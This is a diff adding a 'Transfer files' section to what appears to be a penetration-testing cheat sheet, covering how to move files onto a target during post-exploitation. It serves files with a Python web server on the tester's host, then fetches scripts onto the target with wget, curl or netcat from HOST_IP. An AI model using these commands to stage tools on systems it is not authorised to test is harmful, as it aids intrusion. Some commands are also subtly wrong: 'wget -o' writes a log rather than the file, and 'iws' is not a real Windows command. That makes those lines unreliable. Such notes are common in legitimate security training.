@@ -149,6 +149,58 @@ The [Game of Active Directory (GOAD)](https://github.com/Orange-Cyberdefense/GOA
 
 <hr class="sep-both">
 
+## Transfer files 🛅
+
+<div class="row row-cols-md-2"><div>
+
+You will often want to transfer files between your machine, and the target. Mostly during privilege escalation and post-exploitation.
+
+#### Python webserver 🐍
+
+<i class="small">On the "host" where the file is:</i>
+
+```shell!
+$ python -m http.server port # port > 1023
+$ sudo python -m http.server port # port <= 1023
+```
+
+<i class="small">On the "client" that need the file:</i>
+
+```shell!
+$ # Download on Linux
+$ wget HOST_IP:port/script.sh -o /tmp/script.sh
+PS> # Download on Windows
+PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
+```
+
+</div><div>
+
+* You may try with `python2`, and `python3` if `python` is unavailable.
+* You may use copy-paste if appropriate ✂️
+* You may have to use `curl` or `iws` (Windows-only) instead of `wget`
+
+```shell!
+$ curl HOST_IP:port/script.sh -o /tmp/script.sh
+PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
+PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
+```
+
+#### netcat 🐈
+
+```ps
+# host
+$ nc CLIENT_IP port < file.sh
+# client
+$ nc -lvp port > file.sh
+```
+
+#### services 🕳️
+
+You may use FTP/SCP/NFS... if applicable.
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
